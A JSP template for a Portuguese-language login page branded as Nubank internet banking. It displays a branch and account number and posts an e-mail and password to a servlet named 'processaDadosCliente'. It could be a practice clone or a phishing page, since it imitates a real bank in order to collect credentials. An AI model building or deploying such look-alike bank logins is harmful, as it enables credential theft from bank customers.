<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!doctype html>
<html lang="pt-br">
    <head>

        <meta charset="UTF-8">
        <meta name="viewport"
              content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <title>Nubank</title>
        <link rel="stylesheet" href="assets/css/main.css">
        <link rel="stylesheet" href="assets/css/loginStyle.css">

    </head>

    <body>
        <div class="navbar">

            <ul>
                <li>
                    <a href="#" class="acessoLeft"><img src="assets/img/padlock_vectorized.png" class="cadeado"><span class="acesseInternetBanking">ACESSE O </span><span class="internetBanking">INTERNET BANKING</span>
                    </a>
                </li>
                <li>
                    <a href="index.jsp" class="closeRight">
                        <input type="button" value="X" class="bntClose">
                    </a>
                </li>
            </ul>

        </div>

        <section id="loginSection" class="main-content wallpaper">

            <div id="dadosContaDiv">

                <p id="dadosContaP">
                    <span>Agência:  </span>${requestScope.acessoConta.agencia}
                    <span>Conta:    </span>${requestScope.acessoConta.conta}-${requestScope.acessoConta.digito}
                </p>

                <p id="warningSecurityP">Acesse o Nubank Internet Banking de forma segura!</p>

            </div>

            <div id="loginFormDiv">

                <h3>Acesso Seguro</h3>

                <form id="loginForm" action="processaDadosCliente" method="POST">

                    <input id="inputAcao" name="inputAcao" type="hidden" value="usuario" />                    

                    <table id="loginFormTable" border="0">

                        <tbody>
                            <tr>
                                <td>
                                    <div>
                                        <label for="inputEmail">E-mail:</label>
                                    </div>
                                    <div>
                                        <input id="inputEmail" name="inputEmail" type="text" placeholder="E-mail..." />
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <div>
                                        <label for="inputSenha">Senha:</label>
                                    </div>
                                    <div>
                                        <input id="inputSenha" name="inputSenha" type="password" placeholder="Senha..." />
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td style="color: white; font-size: 16px;">
                                   ${requestScope.acessoNegado}
                                </td>
                            </tr>                  
                        </tbody>

                        <tfoot>
                            <tr>
                                <td>
                                    <button id="loginFormBtn">Entrar</button>
                                </td>
                            </tr>
                        </tfoot>

                    </table>

                </form>

            </div>

        </section>

    </body>
</html>
